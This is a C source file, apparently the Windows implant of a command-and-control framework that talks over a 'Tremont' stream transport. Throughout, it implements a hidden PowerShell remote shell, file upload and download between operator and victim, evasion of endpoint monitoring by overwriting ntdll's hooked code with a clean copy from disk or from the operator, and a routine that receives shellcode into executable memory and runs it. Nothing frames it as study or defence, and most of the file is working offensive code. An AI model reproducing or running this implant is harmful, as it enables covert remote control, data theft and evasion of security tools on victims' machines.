#define _AMD64_
#include<synchapi.h>
#include<TlHelp32.h>
#include<Psapi.h>

#include "../transport/transport.h"
#include "../ctrl.h"
#include "jobs.h"

int track_job(HANDLE* job_thread, struct jobs_t* jobs) {
    /*
        find next active in use slot
        set handle to job_thread job
        set active to 1
    */
    EnterCriticalSection(&jobs->jobs_cs);
    
    int next_free_slot = -1;
    int cur_slot = 0;
    
    while (next_free_slot == -1 && cur_slot != MAX_JOBS) {
        if (jobs->jobs[cur_slot].active == JOB_ACTIVE) cur_slot++;
        else next_free_slot = cur_slot;
    }
    
    if (next_free_slot != -1) {
        jobs->jobs[next_free_slot].job_thread = job_thread;
        jobs->jobs[next_free_slot].active = JOB_ACTIVE;
    }

    LeaveCriticalSection(&jobs->jobs_cs);
    
    return next_free_slot;
}

uint32_t calc_percentage(int num, int denom) {
    uint64_t temp = num * 100;
    return (uint32_t)(temp / denom);
}

void untrack_job(HANDLE* job_thread, struct jobs_t* jobs) {
    int cur_slot = 0;

    EnterCriticalSection(&jobs->jobs_cs);
    
    while (jobs->jobs[cur_slot].job_thread != job_thread &&
        cur_slot != MAX_JOBS)
        cur_slot++;

    jobs->jobs[cur_slot].active = JOB_NOT;

    LeaveCriticalSection(&jobs->jobs_cs);
}

void jobs_init(struct jobs_t* jobs) {
    for (int i = 0; i < MAX_JOBS; i++) {
        jobs->jobs[i].active = JOB_NOT;
    }
}

struct powershell_info {
    PROCESS_INFORMATION proc_info;
    HANDLE child_out_rd;
    HANDLE child_out_wr;
    HANDLE child_in_rd;
    HANDLE child_in_wr;
};

int _init_powershell_proc(struct powershell_info* info) {
    SECURITY_ATTRIBUTES sec_attr;
    sec_attr.nLength = sizeof(sec_attr);
    sec_attr.bInheritHandle = TRUE;
    sec_attr.lpSecurityDescriptor = NULL;

    /* Connect the output from the process to a file descriptor */
    BOOL res = FALSE;
    res = CreatePipe(
        &info->child_out_rd,
        &info->child_out_wr,
        &sec_attr,
        0
    );
    if (res == FALSE) return -1;
    SetHandleInformation(
        info->child_out_rd,
        HANDLE_FLAG_INHERIT,
        0
    );

    /* Connect the input from the process to a file descriptor */
    res = CreatePipe(
        &info->child_in_rd,
        &info->child_in_wr,
        &sec_attr,
        0
    );
    if (res == FALSE) return -1;
    SetHandleInformation(
        info->child_in_wr,
        HANDLE_FLAG_INHERIT,
        0
    );

    STARTUPINFO startup_info;
    ZeroMemory(&startup_info, sizeof(startup_info));

    startup_info.cb = sizeof(STARTUPINFO);
    startup_info.dwFlags = STARTF_USESTDHANDLES;
#ifdef NDEBUG
    startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = SW_HIDE;
#endif
    startup_info.hStdError = info->child_out_wr;
    startup_info.hStdOutput = info->child_out_wr;
    startup_info.hStdInput = info->child_in_rd;

    ZeroMemory(&info->proc_info, sizeof(PROCESS_INFORMATION));

    wchar_t cmd[] = L"powershell.exe";

    res = CreateProcessW(
        NULL,
        cmd,
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        &startup_info,
        &info->proc_info
    );
    if (res == FALSE) return -1;

    return 0;
}

void _cleanup_powershell(struct powershell_info* info) {
    CloseHandle(info->proc_info.hProcess);
    CloseHandle(info->proc_info.hThread);
    CloseHandle(info->child_out_rd);
    CloseHandle(info->child_out_wr);
    CloseHandle(info->child_in_rd);
    CloseHandle(info->child_in_wr);
}

void implant_powershell(tremont_stream_id stream_id, Tremont_Nexus* nexus) {
    int res = -1;

    struct powershell_info info;
    res = _init_powershell_proc(&info);
    if (res != 0) {
        //perror("Unable to start Powershell!\n");
        exit(-1);
    }

    tremont_opts_stream(stream_id, OPT_NONBLOCK, 1, nexus);

    char temp_recv[255];
    char temp_out[255];
    int written = 0;
    int recvd = 0;
    int avail = 0;
    int read = 0;

    while (1) {
        if (WaitForSingleObject(
            info.proc_info.hProcess, 0) == WAIT_OBJECT_0) {
            break;
        }
        if (tremont_poll_stream(stream_id, nexus) == -1) break;
        memset(temp_recv, 0, sizeof(temp_recv));
        recvd = tremont_recv(stream_id, temp_recv, sizeof(temp_recv), nexus);

        if (recvd > 0) {
            WriteFile(info.child_in_wr, temp_recv, recvd, &written, NULL);
        }

        PeekNamedPipe(
            info.child_out_rd,
            NULL,
            0,
            NULL,
            &avail,
            NULL
        );

        if (avail > 0) {
            memset(temp_out, 0, sizeof(temp_out));
            ReadFile(info.child_out_rd, temp_out, sizeof(temp_out), &read, NULL);
            tremont_send(stream_id, temp_out, read, nexus);
        }
    }

    tremont_end_stream(stream_id, nexus);
    _cleanup_powershell(&info);
}

int implant_upload(struct wrkr_trans_t* trans, struct upload_req_t* req) {
    Tremont_Nexus* nexus = trans->nexus;
    tremont_stream_id stream_id = trans->stream_id;
    
    char full_path_buf[256];
    memset(full_path_buf, 0, sizeof(full_path_buf));

    GetFullPathNameA(req->dest_path,
        sizeof(full_path_buf),
        full_path_buf,
        NULL
    );

    HANDLE file_handle;
    file_handle = CreateFileA(full_path_buf,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    struct wrkr_msg_t msg;
    msg.msg_enum = UPLOAD;
    msg.upload.msg_enum = RES;
    
    if (file_handle == INVALID_HANDLE_VALUE) {
        msg.upload.res.allowed = 0;
        tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);
        return -1;
    } else {
        msg.upload.res.allowed = 1;
        tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);
    }

    int64_t total_recvd = 0;
    int64_t total_size = req->file_len;
    
    int recvd = 0;
    int written = 0;
    char temp_buf[255];

    tremont_opts_stream(stream_id, OPT_NONBLOCK, 1, nexus);

    while (total_recvd < total_size) {
        recvd = tremont_recv(stream_id,
            (byte*)temp_buf, sizeof(temp_buf), nexus);
        WriteFile(file_handle, temp_buf, recvd, &written, 0);
        total_recvd += recvd;
    }
    
    memset(&msg, 0, sizeof(msg));
    msg.msg_enum = UPLOAD;
    msg.upload.msg_enum = FIN;
    msg.upload.fin.sanity = 1;

    tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);

    memset(&msg, 0, sizeof(msg));
    tremont_recv(stream_id, (byte*)&msg, sizeof(msg), nexus);

    tremont_end_stream(stream_id, nexus);
    return 0;
}

int implant_download(struct wrkr_trans_t* trans, struct download_req_t* req) {
    Tremont_Nexus* nexus = trans->nexus;
    tremont_stream_id stream_id = trans->stream_id;

    char full_path_buf[256];
    memset(full_path_buf, 0, sizeof(full_path_buf));

    GetFullPathNameA(req->path,
        sizeof(full_path_buf),
        full_path_buf,
        NULL
    );

    HANDLE file_handle;
    file_handle = CreateFileA(full_path_buf,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    struct wrkr_msg_t msg;
    msg.msg_enum = DOWNLOAD;
    msg.download.msg_enum = RES;

    int64_t total_size = 0;

    if (file_handle == INVALID_HANDLE_VALUE) {
        msg.upload.res.allowed = 0;
        msg.download.res.file_len = -1;
        tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);
        return -1;
    }
    else {
        GetFileSizeEx(file_handle, (PLARGE_INTEGER)&total_size);
        msg.download.res.allowed = 1;
        msg.download.res.file_len = total_size;
        tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);
    }

    int64_t total_sent = 0;
    int sent = 0;
    int read = 0;
    char temp_buf[255];

    while (total_sent < total_size) {
        ReadFile(file_handle, temp_buf, 
            sizeof(temp_buf), &read, 0);
        sent = tremont_send(stream_id,
            (byte*)temp_buf, read, nexus);
        total_sent += sent;
    }

    memset(&msg, 0, sizeof(msg));
    msg.msg_enum = DOWNLOAD;
    msg.upload.msg_enum = FIN;
    msg.upload.fin.sanity = 1;

    tremont_send(stream_id, (byte*)&msg, sizeof(msg), nexus);

    memset(&msg, 0, sizeof(msg));
    tremont_recv(stream_id, (byte*)&msg, sizeof(msg), nexus);

    tremont_end_stream(stream_id, nexus);
    return 0;
}

void _freeze_all_other_threads() {
    uint32_t my_thread_id;
    my_thread_id = GetCurrentThreadId();

    HANDLE snapshot;
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    THREADENTRY32 thread_entry;
    thread_entry.dwSize = sizeof(thread_entry);
    Thread32First(snapshot, &thread_entry);

    int process_id;
    process_id = GetCurrentProcessId();

    do {
        if (thread_entry.th32ThreadID == my_thread_id) continue;
        if (thread_entry.th32OwnerProcessID != process_id) continue;

        HANDLE thread_handle;
        thread_handle = OpenThread(THREAD_ALL_ACCESS,
            FALSE,
            thread_entry.th32ThreadID);

        if (thread_handle != 0) {
            SuspendThread(thread_handle);
            CloseHandle(thread_handle);
        }

        thread_entry.dwSize = sizeof(thread_entry);
    } while (Thread32Next(snapshot, &thread_entry));
}

void _unfreeze_all_other_threads() {
    uint32_t my_thread_id;
    my_thread_id = GetCurrentThreadId();

    HANDLE snapshot;
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    THREADENTRY32 thread_entry;
    thread_entry.dwSize = sizeof(thread_entry);
    Thread32First(snapshot, &thread_entry);

    int process_id;
    process_id = GetCurrentProcessId();

    do {
        if (thread_entry.th32ThreadID == my_thread_id) continue;
        if (thread_entry.th32OwnerProcessID != process_id) continue;

        HANDLE thread_handle;
        thread_handle = OpenThread(THREAD_ALL_ACCESS,
            FALSE,
            thread_entry.th32ThreadID);

        if (thread_handle != 0) {
            ResumeThread(thread_handle);
            CloseHandle(thread_handle);
        }

        thread_entry.dwSize = sizeof(thread_entry);
    } while (Thread32Next(snapshot, &thread_entry));
}

//based off of https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
int implant_unhookl(struct wrkr_trans_t* trans, struct unhookl_req_t* req) {
    struct wrkr_msg_t msg;
    msg.msg_enum = UNHOOK_L;
    msg.upload.msg_enum = RES;
    msg.upload.res.allowed = 1;
    
    tremont_send(trans->stream_id, (byte*)&msg,
        sizeof(msg), trans->nexus);

    _freeze_all_other_threads();

    MODULEINFO module_info;
    HANDLE process_handle = GetCurrentProcess();
    HMODULE ntdll_module = GetModuleHandleA("ntdll.dll");
    if (ntdll_module == NULL) return -1;

    GetModuleInformation(process_handle,
        ntdll_module, &module_info, sizeof(module_info));

    void* ntdll_base = module_info.lpBaseOfDll;
    HANDLE ntdll_file = CreateFileA(
        "c:\\windows\\system32\\ntdll.dll", 
        GENERIC_READ, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING, 
        0, 
        NULL
    );
   
    HANDLE ntdll_filemap = CreateFileMapping(ntdll_file, 
        NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (ntdll_filemap == NULL) goto ERR;
    
    void* ntdll_mmap = MapViewOfFile(ntdll_filemap,
        FILE_MAP_READ, 0, 0, 0);
    if (ntdll_mmap == NULL) goto ERR;

    PIMAGE_DOS_HEADER dos_header;
    dos_header = (PIMAGE_DOS_HEADER)ntdll_base;

    PIMAGE_NT_HEADERS nt_headers;
    nt_headers = (PIMAGE_NT_HEADERS)(
        (DWORD_PTR)ntdll_base + dos_header->e_lfanew
    );

    for (uint16_t i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER section_header;
        section_header = (PIMAGE_SECTION_HEADER)(
            (DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + 
            ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i)
        );

        if (strncmp(section_header->Name, ".text", 5)) continue;
        
        BOOL is_protected;
        uint32_t old_protection;
        uint32_t size_of_text;
        
        DWORD* file_text_section;
        DWORD* running_text_section;

        size_of_text = section_header->Misc.VirtualSize;

        running_text_section = (DWORD*)ntdll_base +
            section_header->VirtualAddress;

        file_text_section = (DWORD*)ntdll_mmap +
            section_header->VirtualAddress;

        is_protected = VirtualProtect(
            running_text_section,
            size_of_text,
            PAGE_EXECUTE_READWRITE,
            &old_protection
        );
        
        memcpy(running_text_section, file_text_section, size_of_text);
        
        is_protected = VirtualProtect(
            running_text_section,
            size_of_text,
            old_protection,
            &old_protection
        );
    }

    _unfreeze_all_other_threads();
    CloseHandle(process_handle);
    CloseHandle(ntdll_file);

    memset(&msg, 0, sizeof(msg));
    msg.msg_enum = UNHOOK_L;
    msg.upload.msg_enum = FIN;
    msg.upload.fin.sanity = 1;

    tremont_send(trans->stream_id, (byte*)&msg, 
        sizeof(msg), trans->nexus);

    memset(&msg, 0, sizeof(msg));
    tremont_recv(trans->stream_id, (byte*)&msg,
        sizeof(msg), trans->nexus);

    tremont_end_stream(trans->stream_id, trans->nexus);

    return 0;

ERR:
    _unfreeze_all_other_threads();
    CloseHandle(process_handle);
    CloseHandle(ntdll_file);
    tremont_end_stream(trans->stream_id, trans->nexus);
    return -1;
}

int implant_unhookbyon(struct wrkr_trans_t* trans, struct unhookbyon_req_t* req) {
    Tremont_Nexus* nexus = trans->nexus;
    tremont_stream_id stream = trans->stream_id;

    struct wrkr_msg_t msg;
    msg.msg_enum = UNHOOK_BYON;
    msg.upload.msg_enum = RES;
    msg.upload.res.allowed = 1;

    tremont_send(stream, (byte*)&msg,
        sizeof(msg), nexus);

    int64_t total_recvd = 0;
    int64_t total_size = req->file_len;

    int recvd = 0;
    int written = 0;
    char temp_buf[255];

    tremont_opts_stream(stream, OPT_NONBLOCK, 1, nexus);

    char* ntdll_buf;
    ntdll_buf = calloc(1, req->file_len);

    while (total_recvd < total_size) {
        recvd = tremont_recv(stream,
            (byte*)temp_buf, sizeof(temp_buf), nexus);
        memcpy(ntdll_buf + total_recvd, temp_buf, recvd);
        total_recvd += recvd;
    }

    tremont_opts_stream(stream, OPT_NONBLOCK, 0, nexus);

    memset(&msg, 0, sizeof(msg));
    msg.msg_enum = UNHOOK_BYON;
    msg.unhookbyon.msg_enum = RES;
    msg.unhookbyon.unhooking.sanity = 1;

    tremont_send(stream, (byte*)&msg, sizeof(msg), nexus);

    _freeze_all_other_threads();

    MODULEINFO module_info;
    HANDLE process_handle = GetCurrentProcess();
    HMODULE ntdll_module = GetModuleHandleA("ntdll.dll");
    if (ntdll_module == NULL) return -1;

    GetModuleInformation(process_handle,
        ntdll_module, &module_info, sizeof(module_info));

    void* ntdll_base = module_info.lpBaseOfDll;

    PIMAGE_DOS_HEADER dos_header;
    dos_header = (PIMAGE_DOS_HEADER)ntdll_base;

    PIMAGE_NT_HEADERS nt_headers;
    nt_headers = (PIMAGE_NT_HEADERS)(
        (DWORD_PTR)ntdll_base + dos_header->e_lfanew
        );

    for (uint16_t i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER section_header;
        section_header = (PIMAGE_SECTION_HEADER)(
            (DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) +
            ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i)
            );

        if (strncmp(section_header->Name, ".text", 5)) continue;

        BOOL is_protected;
        uint32_t old_protection;
        uint32_t size_of_text;

        DWORD* uploaded_text_section;
        DWORD* running_text_section;

        size_of_text = section_header->Misc.VirtualSize;

        running_text_section = (DWORD*)ntdll_base +
            section_header->VirtualAddress;

        uploaded_text_section = (DWORD*)ntdll_buf +
            section_header->VirtualAddress;

        is_protected = VirtualProtect(
            running_text_section,
            size_of_text,
            PAGE_EXECUTE_READWRITE,
            &old_protection
        );

        memcpy(running_text_section, uploaded_text_section, size_of_text);

        is_protected = VirtualProtect(
            running_text_section,
            size_of_text,
            old_protection,
            &old_protection
        );
    }

    _unfreeze_all_other_threads();
    CloseHandle(process_handle);
    free(ntdll_buf);

    memset(&msg, 0, sizeof(msg));
    msg.msg_enum = UNHOOK_L;
    msg.upload.msg_enum = FIN;
    msg.upload.fin.sanity = 1;

    tremont_send(trans->stream_id, (byte*)&msg,
        sizeof(msg), trans->nexus);

    memset(&msg, 0, sizeof(msg));
    tremont_recv(trans->stream_id, (byte*)&msg,
        sizeof(msg), trans->nexus);

    tremont_end_stream(trans->stream_id, trans->nexus);

    return 0;
}

int implant_runcode(struct wrkr_trans_t* trans, struct runcode_req_t* req) {
    Tremont_Nexus* nexus = trans->nexus;
    tremont_stream_id stream = trans->stream_id;

    struct wrkr_msg_t msg;
    msg.msg_enum = UNHOOK_BYON;
    msg.upload.msg_enum = RES;
    msg.upload.res.allowed = 1;

    tremont_send(stream, (byte*)&msg,
        sizeof(msg), nexus);

    int64_t total_recvd = 0;
    int64_t total_size = req->file_len;

    int recvd = 0;
    int written = 0;
    char temp_buf[255];

    tremont_opts_stream(stream, OPT_NONBLOCK, 1, nexus);

    char* shellcode_buf;
    shellcode_buf = VirtualAlloc(NULL, total_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    while (total_recvd < total_size) {
        recvd = tremont_recv(stream,
            (byte*)temp_buf, sizeof(temp_buf), nexus);
        memcpy(shellcode_buf + total_recvd, temp_buf, recvd);
        total_recvd += recvd;
    }

    tremont_opts_stream(stream, OPT_NONBLOCK, 0, nexus);

    memset(&msg, 0, sizeof(msg));
    msg.msg_enum = UNHOOK_BYON;
    msg.unhookbyon.msg_enum = RES;
    msg.unhookbyon.unhooking.sanity = 1;

    tremont_send(stream, (byte*)&msg, sizeof(msg), nexus);

    ((void(*)())(shellcode_buf))(); //my favorite thing in all of C

    VirtualFree(shellcode_buf, total_size, MEM_RELEASE);

    memset(&msg, 0, sizeof(msg));
    msg.msg_enum = UNHOOK_L;
    msg.upload.msg_enum = FIN;
    msg.upload.fin.sanity = 1;

    tremont_send(trans->stream_id, (byte*)&msg,
        sizeof(msg), trans->nexus);

    memset(&msg, 0, sizeof(msg));
    tremont_recv(trans->stream_id, (byte*)&msg,
        sizeof(msg), trans->nexus);

    tremont_end_stream(trans->stream_id, trans->nexus);

    return 0;
}